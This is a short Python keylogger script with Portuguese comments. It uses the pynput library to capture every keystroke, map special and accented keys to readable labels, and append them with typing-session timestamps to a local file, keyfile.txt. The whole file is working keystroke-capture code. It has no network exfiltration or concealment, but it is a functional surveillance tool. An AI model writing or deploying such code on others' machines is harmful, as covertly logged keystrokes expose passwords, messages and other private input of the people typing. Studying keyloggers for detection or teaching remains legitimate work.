from pynput import keyboard
import time
import datetime

# Dicionário de mapeamento de teclas especiais para nomes legíveis
special_keys = {
    keyboard.Key.space: " [espaço] ",
    keyboard.Key.shift: " [shift] ",
    keyboard.Key.ctrl: " [ctrl] ",
    keyboard.Key.alt: " [alt] ",
    keyboard.Key.cmd: " [cmd] ",
    keyboard.Key.enter: " [return] ",
    keyboard.Key.backspace: " [del] ",
    "`": "`",  # Tecla `
    "~": "~",  # Tecla ~
    "'": "'",  # Tecla '
    "ç": "ç",  # Tecla ç
    "é": "é",  # Tecla é
    "á": "á",  # Tecla á
    "ã": "ã",  # Tecla ã
    "?": "?",  # Tecla ?
    "/": "/",  # Tecla /
    # Adicione outras teclas especiais aqui
}

is_typing = False
last_key_time = time.time()

def key_pressed(key):
    global is_typing, last_key_time
    
    current_time = time.time()
    time_elapsed = current_time - last_key_time
    
    if time_elapsed >= 300:  # 300 segundos = 5 minutos
        if is_typing:
            with open("keyfile.txt", 'a') as logkey:
                logkey.write("\n[Término de Digitação: {}]\n".format(datetime.datetime.now()))
            is_typing = False
    
    if key in special_keys:
        char = special_keys[key]
    else:
        try:
            char = key.char  # Tenta obter o caractere da tecla pressionada
        except AttributeError:
            char = str(key)  # Tecla especial não possui caractere associado
    
    if not is_typing:
        with open("keyfile.txt", 'a') as logkey:
            logkey.write("\n[Início de Digitação: {}]\n".format(datetime.datetime.now()))
        is_typing = True
    
    print(char)  # Imprime o caractere ou nome legível
    with open("keyfile.txt", 'a') as logkey:
        if char is not None:
            logkey.write(char)

    last_key_time = current_time

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()
